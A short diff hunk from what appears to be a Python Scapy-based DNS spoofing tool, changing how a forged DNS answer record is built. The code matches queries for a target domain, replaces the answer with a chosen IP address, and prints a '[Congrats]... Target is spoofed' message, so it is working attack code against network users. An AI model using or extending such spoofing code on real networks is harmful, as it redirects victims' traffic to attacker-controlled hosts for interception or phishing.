@@ -123,7 +123,7 @@ try:
             reqname = ippacket[sc.DNSQR].qname
             if domain in str(reqname):
                 print("[Congrats] --> Target is spoofed and directed to "+str(ip)+" ....")
-                anspof = sc.DNSRR(rrname=reqname, rdata=str(ip))
+                anspof = sc.DNSRR(rrname=reqname, rdata=ip)
                 ippacket[sc.DNS].an = anspof
                 ippacket[sc.DNS].ancount = 1
                 del ippacket[sc.IP].len
